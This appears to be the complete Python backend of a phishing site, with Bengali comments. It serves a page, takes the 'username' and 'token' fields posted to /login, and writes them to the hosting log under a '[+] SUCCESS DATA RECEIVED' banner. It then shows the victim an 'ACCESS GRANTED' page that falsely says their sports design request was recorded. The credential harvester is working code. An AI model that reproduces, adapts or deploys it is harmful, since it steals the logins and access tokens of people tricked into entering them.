import http.server
import urllib.parse
import os
import sys

class MyHandler(http.server.SimpleHTTPRequestHandler):
    # GET রিকোয়েস্ট হ্যান্ডলার (এটি index.html ফাইলটি সঠিকভাবে ব্রাউজারে লোড করাবে)
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.path = '/index.html'
        return super().do_GET()

    # POST রিকোয়েস্ট হ্যান্ডলার (এটি সাবমিট করা ডাটা রিসিভ এবং প্রিন্ট করবে)
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            fields = urllib.parse.parse_qs(post_data)
            
            user = fields.get('username', [''])[0]
            token = fields.get('token', [''])[0]
            
            # রেন্ডার (Render) ড্যাশবোর্ডের লগে ডাটা ইনস্ট্যান্ট প্রিন্ট করার জন্য
            sys.stdout.write("\n" + "="*40 + "\n")
            sys.stdout.write(f"[+] SUCCESS DATA RECEIVED:\n")
            sys.stdout.write(f"Client Name / Email: {user}\n")
            sys.stdout.write(f"Access Pass-Token: {token}\n")
            sys.stdout.write("="*40 + "\n")
            sys.stdout.flush()
            
            # ব্রাউজারে রেসপন্স পাঠানো
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            success_html = """
            <html>
            <body style="background-color: #060814; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
                <h2 style="color: #ff4757;">✔ ACCESS GRANTED!</h2>
                <p style="color: #a4b0be;">আপনার কাস্টম স্পোর্টস ডিজাইন ডাটাবেজে রিকোয়েস্ট পাঠানো হয়েছে।</p>
            </body>
            </html>
            """
            self.wfile.write(success_html.encode('utf-8'))
        else:
            self.send_error(404, "File Not Found")

# রেন্ডার পোর্টের সাথে বাইন্ডিং
port = int(os.environ.get("PORT", 8080))
server_address = ('', port)
httpd = http.server.HTTPServer(server_address, MyHandler)
print(f"[*] Sports Design Server Running on port {port}...", flush=True)
sys.stdout.flush()
httpd.serve_forever()
